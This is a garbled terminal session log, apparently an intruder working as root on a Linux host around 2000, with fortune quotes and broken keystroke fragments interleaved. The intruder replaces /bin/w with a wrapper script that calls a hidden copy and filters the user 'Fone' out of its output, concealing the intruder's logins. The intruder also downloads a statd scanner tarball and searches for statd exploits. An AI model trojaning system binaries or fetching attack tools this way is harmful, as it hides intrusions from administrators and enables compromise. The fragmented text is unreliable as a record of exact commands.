+essing '/usr/lib/joe/joerc'...done
+    IW   /bin/w                       Row 1    Col 1   11:03  Ctrl-K H for help
+#!/bin/bash
+/bin/.w $1 $2 $3 $4 $5|egrep -v "Fone|Fone1"
+** Joe's Own Editor v2.8 ** Copyright (C) 1995 Joseph H. Allen **
+
+File /bin/w not changed so no update needed.
+
+"The lesser of two evils -- is evil."
+-- Seymour (Sy) Leon
+
+Ho Hum Dee Dum
+
+[root@ariel .Fone]# /
+
+: /bin/w: Permission denied
+
+"Good health" is merely the slowest rate at which one can die.
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# chm
+
+ who attacks the fundamentals of the American broadcasting industry
+attacks democracy itself.
+		-- William S. Paley, chairman of CBS
+
+Ho Hum Dee Dum
+
+[root@ariel .Fone]# 
+
+:03am  up  2:40,  2 users,  load average: 0.04, 0.01, 0.00
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT
+Fone     pts/0    ppp-207-193-0-12 10:55am  0.00s  0.85s   ?     -
+Fone     pts/1    1Cust44.tnt31.ch 11:01am 10.00s  0.40s   ?     -
+
+Cure the disease and kill the patient.
+		-- Francis Bacon
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# c
+
+r/
+
+The most popular labor-saving device today is still a husband with money.
+		-- Joey Adams, "Cindy and I"
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# w
+
+04am  up  2:40,  2 users,  load average: 0.03, 0.01, 0.00
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT
+Fone     pts/0    ppp-207-193-0-12 10:55am  0.00s  0.86s   ?     -
+Fone     pts/1    1Cust44.tnt31.ch 11:01am  2.00s  0.41s   ?     -
+
+Mike:	"The Fourth Dimension is a shambles?"
+Bernie:	"Nobody ever empties the ashtrays.  People are SO inconsiderate."
+		-- Gary Trudeau, "Doonesbury"
+
+Try cd...
+
+[root@ariel .Fone]# c
+
+w 
+
+Matz's Law:
+	A conclusion is the place where you got tired of thinking.
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# w
+
+/bin/w: /bin/.w: No such file or directory
+
+You can be replaced by this computer.
+
+Try cd...
+
+[root@ariel .Fone]# w
+
+/bin/w: /bin/.w: No such file or directory
+
+"Ask not what A Group of Employees can do for you.  But ask what can 
+All Employees do for A Group of Employees."    
+-- Mike Dennison
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# r
+
+Decisions of the judges will be final unless shouted down by a really over-
+whelming majority of the crowd present.  Abusive and obscene language may
+not be used by contestants when addressing members of the judging panel,
+or, conversely, by members of the judging panel when addressing contestants
+(unless struck by a boomerang).
+		-- Mudgeeraba Creek Emu-Riding and Boomerang-Throwing Assoc.
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# w
+
+: /usr/bin/w: No such file or directory
+
+I've known him as a man, as an adolescent and as a child -- sometimes
+on the same day.
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# p
+
+ID TTY      STAT   TIME COMMAND
+    1 ?        S      0:04 init [3]
+    2 ?        SW     0:00 [kflushd]
+    3 ?        SW     0:00 [kupdate]
+    4 ?        SW     0:00 [kpiod]
+    5 ?        SW     0:00 [kswapd]
+    6 ?        SW<    0:00 [mdrecoveryd]
+  309 ?        S      0:00 /sbin/pump -i eth0
+  362 ?        S      0:00 portmap
+  377 ?        SW     0:00 [lockd]
+  378 ?        SW     0:00 [rpciod]
+  387 ?        S      0:00 rpc.statd
+  401 ?        S      0:00 /usr/sbin/apmd -p 10 -w 5 -W -s /etc/sysconfig/apm-sc
+  428 ?        S      0:00 /usr/sbin/automount --timeout 60 /misc file /etc/auto
+  481 ?        S      0:00 syslogd -m 0
+  490 ?        S      0:00 klogd
+  504 ?        S      0:00 identd -e -o
+  506 ?        S      0:00 identd -e -o
+  508 ?        S      0:00 identd -e -o
+  510 ?        S      0:00 identd -e -o
+  511 ?        S      0:00 identd -e -o
+  522 ?        S      0:00 /usr/sbin/atd
+  554 ?        S      0:00 inetd
+  568 ?        S      0:00 smbd -D
+  577 ?        S      0:00 nmbd -D
+  591 ?        S      0:00 lpd
+  639 ?        S      0:00 sendmail: accepting connections on port 25
+  738 ?        S      0:00 xfs -droppriv -daemon -port -1
+  753 ?        S      0:00 /usr/sbin/amd -F /etc/amd.conf
+  795 tty2     S      0:00 /sbin/mingetty tty2
+  796 tty3     S      0:00 /sbin/mingetty tty3
+  797 tty4     S      0:00 /sbin/mingetty tty4
+  798 tty5     S      0:00 /sbin/mingetty tty5
+  799 tty6     S      0:00 /sbin/mingetty tty6
+  802 tty1     S      0:00 /sbin/mingetty tty1
+  926 pts/0    S      0:00 -bash
+  961 pts/0    S      0:00 bash
+ 1080 pts/1    S      0:00 -bash
+ 1103 pts/1    S      0:00 bash
+
+God was satisfied with his own work, and that is fatal.
+		-- Samuel Butler
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# r
+
+Research is to see what everybody else has seen, and think what nobody
+else has thought.
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# m
+
+/bin/.w: No such file or directory
+
+Is that really YOU that is reading this?
+
+Ho Hum Dee Dum
+
+[root@ariel .Fone]# w
+
+: /usr/bin/w: No such file or directory
+
+Wagner's music is better than it sounds.
+		-- Mark Twain
+
+Try cd...
+
+[root@ariel .Fone]# /
+
+ /bin/w: No such file or directory
+
+/* Halley */
+
+	(Halley's comment.)
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# cp /bin/w /usr/sbin/w
+
+w
+
+/bin/w: No such file or directory
+
+John			Dame May		Oscar
+Was Gay			Was Whitty		Was Wilde
+But Gerard Hopkins	But John Greenleaf	But Thornton
+Was Manley		Was Whittier		Was Wilder
+		-- Willard Espy
+
+Try cd...
+
+[root@ariel .Fone]# w
+
+: /usr/bin/w: No such file or directory
+
+I'm very old-fashioned.  I believe that people should marry for life,
+like pigeons and Catholics.
+		-- Woody Allen
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# w
+
+bin/w /usr/bin/w
+
+/bin/w: No such file or directory
+
+Pascal Users:
+	To show respect for the 313th anniversary (tomorrow) of the
+	death of Blaise Pascal, your programs will be run at half speed.
+
+Ho Hum Dee Dum
+
+[root@ariel .Fone]# t
+
+ng 206.54.189.134...
+
+telnet: Unable to connect to remote host: Connection refused
+
+QOTD:
+	Flash!  Flash!  I love you! ...but we only have fourteen hours to
+	save the earth!
+
+Try cd...
+
+[root@ariel .Fone]# 
+
+Are you selling NYLON OIL WELLS??  If so, we can use TWO DOZEN!!
+
+Try cd...
+
+[root@ariel .Fone]# .
+
+ktop
+
+Documentation:
+	Instructions translated from Swedish by Japanese for English
+	speaking persons.
+
+Try cd...
+
+[root@ariel .Fone]# l
+
+24r(B)0Looking up packetstorm.securify.com first.
+Getting http://packetstorm.securify.com/
+Looking up packetstorm.securify.com.
+Making HTTP connection to packetstorm.securify.com.
+Sending HTTP request.
+HTTP request sent; waiting for response.
+
+Exiting via interrupt: 2
+
+People are always available for work in the past tense.
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# l
+
+1;24r(B)0Looking up hack.co.za first.
+Getting http://hack.co.za/
+Looking up hack.co.za.
+Making HTTP connection to hack.co.za.
+Alert!: Unable to connect to remote host.
+
+Looking up hack.co.za first.
+Looking up hack.co.za.
+Making HTTP connection to hack.co.za.
+Alert!: Unable to connect to remote host.
+
+lynx: Can't access startfile http://hack.co.za/
+
+I prefer rogues to imbeciles because they sometimes take a rest.
+		-- Alexandre Dumas, fils
+
+Try cd...
+
+[root@ariel .Fone]# l
+
+24r(B)0Looking up www.hack.co.za first.
+Getting http://www.hack.co.za/
+Looking up www.hack.co.za.
+Making HTTP connection to www.hack.co.za.
+Alert!: Unable to connect to remote host
+
+Looking up www.hack.co.za first.
+Looking up www.hack.co.za.
+Making HTTP connection to www.hack.co.za.
+Alert!: Unable to connect to remote host.
+
+lynx: Can't access startfile http://www.hack.co.za/
+
+Life exists for no known purpose.
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# l
+
+h: lyunx: command not found
+
+Simon's Law:
+	Everything put together falls apart sooner or later.
+
+Ho Hum Dee Dum
+
+[root@ariel .Fone]# lyunx packetstoirm.securify.com
+
+ecurify.com
+
+acketstorm.securify.com
+[root@ariel .Fone]# ly
+
+24r(B)0Looking up packetstorm.securify.com first.
+Getting http://packetstorm.securify.com/
+Looking up packetstorm.securify.com.
+Making HTTP connection to packetstorm.securify.com.
+Sending HTTP request.
+HTTP request sent; waiting for response.
+
+m
+
+Exiting via interrupt: 2
+
+Well, fancy giving money to the Government!
+Might as well have put it down the drain.
+Fancy giving money to the Government!
+Nobody will see the stuff again.
+Well, they've no idea what money's for --
+Ten to one they'll start another war.
+I've heard a lot of silly things, but, Lor'!
+Fancy giving money to the Government!
+		-- A.P. Herbert
+
+Ho Hum Dee Dum
+
+[root@ariel .Fone]# w
+
+/packetstorm.securify.com/UNIX/scanners/statdx-sc an.tar.gz
+
+:09:00--  http://packetstorm.securify.com:80/UNIX/scanners/statdx-scan.tar.gz
+           => `statdx-scan.tar.gz'
+Connecting to packetstorm.securify.com:80... connected!
+HTTP request sent, awaiting response... 
+
+A hundred years from now it is very likely that [of Twain's works] "The
+Jumping Frog" alone will be remembered.
+		-- Harry Thurston Peck (Editor of "The Bookman"), January 1901.
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# l
+
+(B)0Looking up www.lycos.com first.
+Getting http://www.lycos.com/
+Looking up www.lycos.com.
+Making HTTP connection to www.lycos.com.
+Sending HTTP request.
+HTTP request sent; waiting for response./1.1 200 OKLycos (p1 of 2)REFRESH(300 sec): http://www.lycos.com/Lycos My Lycos | Site Map[f;h=f_textl;pos=3;sz=140x37;tile=3;!category=financial;ord=1000707?] [f;h=f;pos=1;sz=230x33;tile=1;!category=financial;ord=1000707?] [f;h=f_textr;pos=2;sz=140x37;tile=2;!category=financial;ord=1000707?] Search for:   _________________________  [g.gif]-Submit AdvancedSearchParental ControlsNov. 23, 2000 CONNECT: Boards  Browser  Calendar  Chat  Clubs  Dating  Ecards  EmailInstant Messaging  Translate  Voicemail  Wireless  MORE 3Data transfer complete7Arrow keys: Up and Down to move.  Right to follow a link; Left to go back.H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history list(NORMAL LINK)   Use right-arrow or <return> to activate.http://www.lycos.com/URL to open: w
+
+7mLooking up www.hack.co.za first.
+Getting http://www.hack.co.za/
+Looking up www.hack.co.za.
+Making HTTP connection to www.hack.co.za.
+Alert!: Unable to connect to remote host
+
+ing http://www.lycos.com/http://www.lycos.com/(NORMAL LINK)   Use right-arrow or <return> to activate.http://www.lycos.com/URL to open: w
+
+7mLooking up packetstorm.securify.com first.
+Getting http://packetstorm.securify.com/
+Looking up packetstorm.securify.com.
+Making HTTP connection to packetstorm.securify.com.
+Sending HTTP request.
+HTTP request sent; waiting for response.
+
+ection interrupted.
+Getting http://www.lycos.com/http://www.lycos.com/(NORMAL LINK)   Use right-arrow or <return> to activate.http://www.lycos.com/http://www.lycos.com/My LycosMy LycosSite MapSite Map[f;h=f_textl;pos=3;sz=140x37;tile=3;!category=financial;ord=1000707?][f;h=f_textl;pos=3;sz=140x37;tile=3;!category=financial;ord=1000707?][f;h=f;pos=1;sz=230x33;tile=1;!category=financial;ord=1000707?][f;h=f;pos=1;sz=230x33;tile=1;!category=financial;ord=1000707?][f;h=f_textr;pos=2;sz=140x37;tile=2;!category=financial;ord=1000707?][f;h=f_textr;pos=2;sz=140x37;tile=2;!category=financial;ord=1000707?]Text entry field) Enter text.  Use UP or DOWN arrows or tab to move off._________________________            Enter text into the field by typing on the keyboard   Ctrl-U to delete all text in field, [Backspace] to delete a character_________________________  Arrow keys: Up and Down to move.  Right to follow a link; Left to go back.H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history listForm submit button) Use right-arrow or <return> to submit ('x' for no cache).[g.gif]-Submit [g.gif]-Submit Text entry field) Enter text.  Use UP or DOWN arrows or tab to move off._________________________            Enter text into the field by typing on the keyboard   Ctrl-U to delete all text in field, [Backspace] to delete a characters
+
+;18Hstatd exploit____________  Arrow keys: Up and Down to move.  Right to follow a link; Left to go back.H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history listForm submit button) Use right-arrow or <return> to submit ('x' for no cache).[g.gif]-Submit Submitting form...
+Getting http://www.lycos.com/srch/?lpv=1&loc=searchhp&query=statd+exploit
+Looking up www.lycos.com.
+Making HTTP connection to www.lycos.com.
+Sending HTTP request.
+HTTP request sent; waiting for response.
+Read 428 bytes of data.
+HTTP/1.1 200 OK
+www.lycos.com cookie: lu=01000000F80214B449AC3A1D6  Allow? (Y/N/Always/neVer)
+'A'lways allowing from domain '.lycos.com'.Search for: "statd exploit" 2http://www.lycos.com/srch/?lpv=1&loc=meta_index&query=statd+exploitLycos Network Lycos Home  |  Site Map  |  My Lycos   [s.gif][s.gif][s.gif][s.gif][r;kw=statd+exploit;pos=1;sz=468x60;tile=1;ratio=1_2;!category=financial;ord=1418100395?]       Track this Searchstatd exploit_____ Go Get It! [ ] Search these results[s_crnr.gif][USEMAP:sb1.gif][p_books.gif] Save on books at Barnes & Noble.comData transfer complete8(NORMAL LINK)   Use right-arrow or <return> to activate.http://www.lycos.com/srch/?lpv=1&loc=meta_index&query=statd+exploit-- press space for more, use arrow keys to move, '?' for help, 'q' to quit.
+
+0Hhttp://www.lycos.com/srch/?lpv=1&loc=meta_index&query=statd+exploit(NORMAL LINK)   Use right-arrow or <return> to activate.Lycos NetworkLycos NetworkLycos HomeLycos HomeSite MapSite MapMy LycosMy Lycos[r;kw=statd+exploit;pos=1;sz=468x60;tile=1;ratio=1_2;!category=financial;ord=1418100395?][r;kw=statd+exploit;pos=1;sz=468x60;tile=1;ratio=1_2;!category=financial;ord=1418100395?]Track this SearchTrack this SearchText entry field) Enter text.  Use UP or DOWN arrows or tab to move off.statd exploit_____           Enter text into the field by typing on the keyboard   Ctrl-U to delete all text in field, [Backspace] to delete a characterstatd exploit_____ Arrow keys: Up and Down to move.  Right to follow a link; Left to go back.H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history listForm submit button) Use right-arrow or <return> to submit ('x' for no cache).Go Get It! Go Get It! Checkbox Field)   Use right-arrow or <return> to toggle.[ ] [ ] NORMAL LINK)   Use right-arrow or <return> to activate.[USEMAP:sb1.gif][USEMAP:sb1.gif][p_books.gif][p_books.gif]Barnes & Noble.com2 POPULAR[ POPULAR | WEB SITES ]  4 Web sites were selected based on user selection trafficBarnes and Noble Keyword]statd exp GO1. DuckTank.Net - Hacking and Computer Security - Last Updated    08.20.00 - DuckTank Tips     DuckTank Files     NT Net Cmds    DefCon Slogans     Visitor Log     Sign Log   Our Mailbag     Tools     Web Security     Linux   DOS Utils   http://www.ducktank.net/    [Translate] 2. Webproze Dotcom Inc.    http://www.hack-n-crack.com/[Translate] 3. UnixGods - Q: Why do PCs have a reset button on the front? A:WEB SITES WEB SITES Barnes and NobleBarnes and NobleOption list) Hit return and use arrow keys and return to select option.KeywordKeywordText entry field) Enter text.  Use UP or DOWN arrows or tab to move off.{xploit__           Enter text into the field by typing on the keyboard   Ctrl-U to delete all text in field, [Backspace] to delete a characterstatd exp Arrow keys: Up and Down to move.  Right to follow a link; Left to go back.H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history listForm submit button) Use right-arrow or <return> to submit ('x' for no cache).GOGONORMAL LINK)   Use right-arrow or <return> to activate.DuckTank.Net - Hacking and Computer Security - Last Updated08.20.00 DuckTank.Net - Hacking and Computer Security - Last Updated08.20.00 TranslateTranslateWebproze Dotcom Inc.Webproze Dotcom Inc.TranslateTranslateDuckTank.Net - Hacking and Computer Security - Last Updated08.20.00 Getting http://click.hotbot.com/director.asp?id=1&target=http://www.ducktank.n
+Looking up click.hotbot.com.
+Making HTTP connection to click.hotbot.com.
+Sending HTTP request.
+HTTP request sent; waiting for response./1.1 302 Object moved
+Data transfer complete
+HTTP/1.1 302 Object moved
+Using http://www.ducktank.net/
+Getting http://www.ducktank.net/
+Looking up www.ducktank.net.
+Making HTTP connection to www.ducktank.net.
+Sending HTTP request.
+HTTP request sent; waiting for response./1.1 200 OK
+Data transfer complete      Security Horizon/Security TribeREFRESH(6 sec): http://www.securityhorizon.comDuckTank.Net is NOWSECURITY HORIZON         and SECURITY TRIBE                   http://www.securityhorizon.com
+
+Commands: Use arrow keys to move, '?' for help, 'q' to quit, '<-' to go back.http://www.securityhorizon.comhttp://www.securityhorizon.comhttp://www.securityhorizon.comGetting http://www.securityhorizon.com/
+Looking up www.securityhorizon.com.
+Making HTTP connection to www.securityhorizon.com.
+Sending HTTP request.
+HTTP request sent; waiting for response./1.1 200 OK
+Data transfer complete               Security HorizonFRAME: topFrameFRAME: leftFrameFRAME: mainFrame
+Commands: Use arrow keys to move, '?' for help, 'q' to quit, '<-' to go back.topFrameGetting http://www.securityhorizon.com/top.html
+Looking up www.securityhorizon.com.
+Making HTTP connection to www.securityhorizon.com.
+Sending HTTP request.
+HTTP request sent; waiting for response./1.1 200 OK
+Data transfer complete             Top[shlogos.gif] [gb-bar.gif] [bs-bar.gif] [dc-bar.gif] [ml-bar.gif] 
+Commands: Use arrow keys to move, '?' for help, 'q' to quit, '<-' to go back.[shlogos.gif]Getting http://www.securityhorizon.com/Security HorizonFRAME: topFrameFRAME: leftFrameFRAME: mainFrame
+Commands: Use arrow keys to move, '?' for help, 'q' to quit, '<-' to go back.topFrametopFrameleftFrameGetting http://www.securityhorizon.com/side.html
+Looking up www.securityhorizon.com.
+Making HTTP connection to www.securityhorizon.com.
+Sending HTTP request.
+HTTP request sent; waiting for response./1.1 200 OK
+Data transfer complete            Side[shtitle.gif] [circ.gif] Security Tools:[Select an O.S.][circ.gif] Security Library: [Select Subject_][circ.gif] S.H. Specific: [Select a page_____][circ.gif] Other: [Select an option](NORMAL LINK)   Use right-arrow or <return> to activate.[shtitle.gif]Getting http://www.securityhorizon.com/Security HorizonFRAME: topFrameFRAME: leftFrameFRAME: mainFrame
+Commands: Use arrow keys to move, '?' for help, 'q' to quit, '<-' to go back.leftFrameleftFramemainFrameGetting http://www.securityhorizon.com/main.html
+Looking up www.securityhorizon.com.
+Making HTTP connection to www.securityhorizon.com.
+Sending HTTP request.
+HTTP request sent; waiting for response./1.1 200 OK  Page (p1 of 2)November 18th, 2000 - RussWe've added pictures from Defcon, Black Hat, and Hope2K to the SHSpecific menu on the left. The site has finally been submitted to allthe search engines. New articles have been compiled and are posted. 2new articles in the Whitepaper section and 1 new one in the managementsection. The *NEW* Security Tribe secure web email server is loadedand ready to go, we're just resolving some DNS issues.I've also put up a FAQ about the domain name changes and our plans forthe future. It's in the SH Specific area to the left.November 16th, 2000-John K.Modified menu system a little.  Added a couple of sections includingonline network utils and games (under the SH Specific) and a new wayto access the links (under the Other).More items will be added as time progresses and if anyone has someinteresting cgi/pl/javascript type utils they want to shoot my wayfeel free.  I am always looking to improve the page and add morevariety.
+
+Data transfer complete
+-- press space for next page --Whitepaper Whitepaper managementGetting http://www.securityhorizon.com/Security HorizonFRAME: topFrameFRAME: leftFrameFRAME: mainFrame
+
+Commands: Use arrow keys to move, '?' for help, 'q' to quit, '<-' to go back.mainFrameGetting http://www.ducktank.net/Security Horizon/Security TribeREFRESH(6 sec): http://www.securityhorizon.com                DuckTank.Net is NOWSECURITY HORIZONand SECURITY TRIBEhttp://www.securityhorizon.com
+Commands: Use arrow keys to move, '?' for help, 'q' to quit, '<-' to go back.http://www.securityhorizon.comGetting http://www.lycos.com/srch/?lpv=1&loc=searchhp&query=statd+exploitSearch for: "statd exploit" (p2 of 8)POPULAR[ POPULAR | WEB SITES ]4 Web sites were selected based on user selection trafficBarnes and Noble [Keyword]statd exp GO1. DuckTank.Net - Hacking and Computer Security - Last Updated08.20.00 - DuckTank Tips     DuckTank Files     NT Net Cmds    DefCon Slogans     Visitor Log     Sign Log   Our Mailbag     Tools     Web Security     Linux   DOS Utils   http://www.ducktank.net/[Translate]2. Webproze Dotcom Inc.http://www.hack-n-crack.com/[Translate]3. UnixGods - Q: Why do PCs have a reset button on the front? A:(NORMAL LINK)   Use right-arrow or <return> to activate.DuckTank.Net - Hacking and Computer Security - Last Updated08.20.00 DuckTank.Net - Hacking and Computer Security - Last Updated08.20.00 TranslateTranslateWebproze Dotcom Inc.Webproze Dotcom Inc.TranslateTranslateUnixGods 3 Because they are expected to run Microsoft operating systems. 101    Reasons Why You Can't Find Your System Administrator -->    http://www.unixgods.org/[Translate]4. Link back to Exploit - If you would like your site included in theExploit random link database, enter the site URL in the form below    then click 'submit'. If you do submit your site, please consider    http://www.exploit.com/backlink.html    [Translate]WEB SITES[ POPULAR | WEB SITES ]1,055 Web sites were found in a search of the complete Lycos Webcatalog1. Solaris Statd exploit - Last modified: Saturday, 24-Apr-199921:30:09 PDT Solaris Statd exploitSummary Description:Solaris2.5.1 x86 remote overflow for statd. There is apparently an   earlier patch which doesn't fix the probl
+
+-- press space for next page --TranslateTranslateLink back to Exploit Link back to Exploit TranslateTranslatePOPULAR POPULAR Solaris Statd exploit 
+4 http://www.insecure.org/sploits/Solaris.statd.html[Translate]2. Solaris 2.5.1 x86 statd exploit - Date Prev] [Date Next] [ThreadPrev] [Thread Next] [Date Index] [Thread Index] Solaris 2.5.1 x86   statd exploit To: BUGTRAQ@NETSPACE.ORG Subject: Solaris 2.5.1 x86statd exploit From: Aleph Onehttp://www.geog.ubc.ca/snag/bugtraq/msg01103.html3. Re: Solaris 2.5.1 x86 statd exploit - Date Prev] [Date Next][Thread Prev] [Thread Next] [Date Index] [Thread Index] Re:    Solaris 2.5.1 x86 statd exploit To: BUGTRAQ@NETSPACE.ORG Subject:    Re: Solaris 2.5.1 x86 statd exploit From: Casper Dihttp://www.geog.ubc.ca/snag/bugtraq/msg01105.html  [Translate] 4. Solaris Statd exploit - Solaris Statd exploitSummaryDescription:Solaris 2.5.1 x86 remote overflow for statd. There is   apparently an earlier patch which doesn't fix the problem.Author:Anonymous Compromise: root (remote) Vulhttp://www.bitpunk.com/arch/s/Solaris.statd.html[Translate]
+
+2HTranslateTranslateSolaris 2.5.1 x86 statd exploit Solaris 2.5.1 x86 statd exploit TranslateTranslateSolaris 2.5.1 x86 statd exploit Solaris 2.5.1 x86 statd exploit Translate3 Because they are expected to run Microsoft operating systems. 101Reasons Why You Can't Find Your System Administrator -->   http://www.unixgods.org/[Translate]4. Link back to Exploit - If you would like your site included in theExploit random link database, enter the site URL in the form belowthen click 'submit'. If you do submit your site, please considerhttp://www.exploit.com/backlink.htmlWEB SITES[ POPULAR | WEB SITES ]1,055 Web sites were found in a search of the complete Lycos Webcatalog1. Solaris Statd exploit - Last modified: Saturday, 24-Apr-199921:30:09 PDT Solaris Statd exploitSummary Description:Solaris2.5.1 x86 remote overflow for statd. There is apparently anearlier patch which doesn't fix the probl
+
+Solaris Statd exploit 
+4 http://www.insecure.org/sploits/Solaris.statd.html[Translate]2. Solaris 2.5.1 x86 statd exploit - Date Prev] [Date Next] [ThreadPrev] [Thread Next] [Date Index] [Thread Index] Solaris 2.5.1 x86   statd exploit To: BUGTRAQ@NETSPACE.ORG Subject: Solaris 2.5.1 x86statd exploit From: Aleph Onehttp://www.geog.ubc.ca/snag/bugtraq/msg01103.html3. Re: Solaris 2.5.1 x86 statd exploit - Date Prev] [Date Next][Thread Prev] [Thread Next] [Date Index] [Thread Index] Re:    Solaris 2.5.1 x86 statd exploit To: BUGTRAQ@NETSPACE.ORG Subject:    Re: Solaris 2.5.1 x86 statd exploit From: Casper Dihttp://www.geog.ubc.ca/snag/bugtraq/msg01105.html  [Translate] 4. Solaris Statd exploit - Solaris Statd exploitSummaryDescription:Solaris 2.5.1 x86 remote overflow for statd. There is   apparently an earlier patch which doesn't fix the problem.Author:Anonymous Compromise: root (remote) Vulhttp://www.bitpunk.com/arch/s/Solaris.statd.html[Translate]
+
+TranslateTranslateSolaris 2.5.1 x86 statd exploit Solaris 2.5.1 x86 statd exploit TranslateTranslateRe: Solaris 2.5.1 x86 statd exploit Re: Solaris 2.5.1 x86 statd exploit Translate
+
+HTranslateSolaris Statd exploit Solaris Statd exploit Translate
+
+5 5. Bugtraq archives for 4th quarter (Oct-Dec) 1997: Re: Solaris 2.5.1x86 statd exploit - Re: Solaris 2.5.1 x86 statd exploit Casper Dik   (casper@HOLLAND.SUN.COM) Tue, 25 Nov 1997 12:20:42 +0100 Messagessorted by: [ date ][ thread ][ subject ][ author ] Next message:X: "r00t advisory [ Mahttp://www.dataguard.no/bugtraq/1997_4/0376.html6. CERT Advisory CA-97.26.statd - Home | What's New | FAQ | Site   Contents | Contact Us | SEARCH About Us | Alerts | Events | FTPArchives | Improving Security | Other Resources | Reports |urvivability Research | Training and Educatihttp://www.cert.org/advisories/CA-97.26.statd.html7. CERT Advisory CA-99-05-statd-automountd - Home | What's New | FAQ   | Site Contents | Contact Us | SEARCH About Us | Alerts | Events |FTP Archives | Improving Security | Other Resources | Reports |Survivability Research | Training and Educatihttp://www.cert.org/advisories/CA-99-05-statd-automountd.html[Translate]8. Vulnerability in statd exposes vulnerability in automountd -
+
+Bugtraq archives for 4th quarter (Oct-Dec) 1997: Re: Solaris 2.5.1x86 statd exploit Bugtraq archives for 4th quarter (Oct-Dec) 1997: Re: Solaris 2.5.1x86 statd exploit TranslateTranslateCERT Advisory CA-97.26.statd CERT Advisory CA-97.26.statd TranslateTranslateCERT Advisory CA-99-05-statd-automountd CERT Advisory CA-99-05-statd-automountd TranslateTranslateVulnerability in statd exposes vulnerability in automountd 
+
+6    INFORMATION BULLETIN J-045: Vulnerability in statd exposesvulnerability in automountd June 11, 1999 23:00 GMT PROBLEM: Twovulnerabilities are address in this advisory: 1) rpc.statd, aprogram used thttp://www.ciac.org/ciac/bulletins/j-045.shtml9. SGI rpc.statd Program Security Vulnerabilities - INFORMATION   BULLETIN G-16: SGI rpc.statd Program Security VulnerabilitiesMarch 4, 1996 19:00 GMT PROBLEM: A problem with SGI rpc.statdprogram. PLATFORM: All SGI systems running IRIX 3.x, 4.x, 5.x, ahttp://www.ciac.org/ciac/bulletins/g-16.shtml10. Exploit world -- Digital ULTRIX and TRU64 UNIX section - Last   modified: Thursday, 13-Jan-2000 13:41:35 PST Exploit world!ULTRIX/Digital UNIX Section Compiled by Fyodor fyodor@dhp.com onThu Jan 13 21:41:31 UTC 2000 [Back] to Fyodor's Playhouse Solaristatinsecure.org/sploits_ultrix.html
+
+TranslateTranslateSGI rpc.statd Program Security Vulnerabilities SGI rpc.statd Program Security Vulnerabilities TranslateTranslateExploit world -- Digital ULTRIX and TRU64 UNIX section Exploit world -- Digital ULTRIX and TRU64 UNIX section Translate7          [ 1,045 More Web Sites about statd exploit ][r;kw=statd+exploit;pos=2;sz=320x20;tile=2;ratio=1_2;!category=financial;ord=1418100395?] Second opinion? Try searching for "statd exploit" at [hb_sr.gif] [r;kw=statd+exploit;pos=1;sz=468x60;tile=1;ratio=1_2;!category=financi                     al;ord=1418100395?] Topics  Shopping  Computers  Entertainment  Finance  Games  KidsMusic  Small Business  Sports  Travel Find  Auctions  Chat  Clubs  Ecards  Email  Free ISP  FTP  MP3  MapsPeople  Stocks  Yellow Pages  More...            Portions powered by and [dh_logo.gif]Copyright  2000 Lycos, Inc. All Rights Reserved. Lycos is a     registered trademark of Carnegie Mellon University.Our Privacy Policy  Terms and Conditions  Standard Advertising Terms
+
+More Web Sites 6 INFORMATION BULLETIN J-045: Vulnerability in statd exposesvulnerability in automountd June 11, 1999 23:00 GMT PROBLEM: Two    vulnerabilities are address in this advisory: 1) rpc.statd, aprogram used thttp://www.ciac.org/ciac/bulletins/j-045.shtml  [Translate]9. SGI rpc.statd Program Security Vulnerabilities - INFORMATION    BULLETIN G-16: SGI rpc.statd Program Security VulnerabilitiesMarch 4, 1996 19:00 GMT PROBLEM: A problem with SGI rpc.statdprogram. PLATFORM: All SGI systems running IRIX 3.x, 4.x, 5.x, a    http://www.ciac.org/ciac/bulletins/g-16.shtml    [Translate]10. Exploit world -- Digital ULTRIX and TRU64 UNIX section - Last   modified: Thursday, 13-Jan-2000 13:41:35 PST Exploit world!ULTRIX/Digital UNIX Section Compiled by Fyodor fyodor@dhp.com onThu Jan 13 21:41:31 UTC 2000 [Back] to Fyodor's Playhouse SolarisStathttp://www.insecure.org/sploits_ultrix.html[Translate]
+
+TranslateTranslateExploit world -- Digital ULTRIX and TRU64 UNIX section Exploit world -- Digital ULTRIX and TRU64 UNIX section TranslateTranslateSGI rpc.statd Program Security Vulnerabilities SGI rpc.statd Program Security Vulnerabilities Translate5 5. Bugtraq archives for 4th quarter (Oct-Dec) 1997: Re: Solaris 2.5.1x86 statd exploit - Re: Solaris 2.5.1 x86 statd exploit Casper Dik(casper@HOLLAND.SUN.COM) Tue, 25 Nov 1997 12:20:42 +0100 Messagessorted by: [ date ][ thread ][ subject ][ author ] Next message:X: "r00t advisory [ Mahttp://www.dataguard.no/bugtraq/1997_4/0376.html   [Translate]6. CERT Advisory CA-97.26.statd - Home | What's New | FAQ | SiteContents | Contact Us | SEARCH About Us | Alerts | Events | FTPArchives | Improving Security | Other Resources | Reports |Survivability Research | Training and Educatihttp://www.cert.org/advisories/CA-97.26.statd.html7. CERT Advisory CA-99-05-statd-automountd - Home | What's New | FAQ| Site Contents | Contact Us | SEARCH About Us | Alerts | Events |FTP Archives | Improving Security | Other Resources | Reports |urvivability Research | Training and Educaticert.org/advisories/CA-99-05-statd-automountd.html8. Vulnerability in statd exposes vulnerability in automountd -
+
